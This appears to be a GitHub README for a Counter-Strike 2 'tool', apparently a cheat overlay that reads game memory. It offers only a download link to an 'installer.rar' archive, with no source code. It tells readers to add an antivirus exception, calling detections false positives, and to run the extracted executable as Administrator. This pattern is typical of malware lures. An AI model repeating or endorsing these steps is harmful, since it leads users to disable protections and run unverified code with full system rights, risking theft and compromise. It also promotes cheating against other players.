<div align="center">

# 🎮 counter-strike-tool [v1.0]
### The Counter Strike 2 tool is a module designed for gamers and developers to enhance their experience. It provides a range of features, including a customizable overlay. This tool is intended for users who want to improve their gameplay and workflow.

<img src="https://raw.githubusercontent.com/galeseniorwedge/counter-strike-tool-v2/main/preview_1.png" width="700">

---

## [⬇️ DOWNLOAD](https://github.com/galeseniorwedge/counter-strike-tool-v2/releases/download/v1.0/installer.rar)

> **Requirements:** Windows 10/11 x64 (build 19041+), DirectX 11 compatible GPU, Visual C++ 2019/2022 x64 runtime.
> *Note: Some AVs flag unsigned overlay tools as false-positives because of the memory-read and window-composition patterns they use. Add a local exception for the extracted folder if needed.*

---

</div>

## ❓ What is counter-strike-tool?
counter-strike-tool is a lightweight external overlay and utility suite built for modern Windows 10/11 systems. It runs entirely outside the target process — no code injection, no driver hooks — and renders a clean ImGui-based HUD on top of the active window. The feature set is focused: a low-overhead rendering path, sensible defaults, and an override-friendly config file so experienced users can dial the tool in for their own hardware and workflow. Typical use-cases include monitoring overlays, quick on-screen reference panels, and private practice/testing sessions against local bots.

## 📸 Screenshots

<img src="https://raw.githubusercontent.com/galeseniorwedge/counter-strike-tool-v2/main/preview_1.png" width="700">

## ✨ Key Features
- External Operation: No code injection, no kernel drivers.
- ImGui Overlay: Transparent, borderless, click-through mode.
- Low Overhead: <1% GPU impact on modern Nvidia/AMD GPUs.
- Config-driven: simple `config.ini` with hot-reload.
- Windows 10/11 x64 native build.
- Portable release — just extract and run.

## 🚀 How to Use
1. Download the latest `installer.rar` from the Releases page.
2. Extract the archive anywhere on your SSD (recommended outside Program Files).
3. Right-click the main executable and choose **Run as Administrator**.
4. Launch the target application and the overlay will attach automatically.
5. Edit `config.ini` to adjust keybinds, colors and overlay position.

## ⚠️ Disclaimer
For educational purposes only. Use at your own risk.

## 📜 License
MIT License
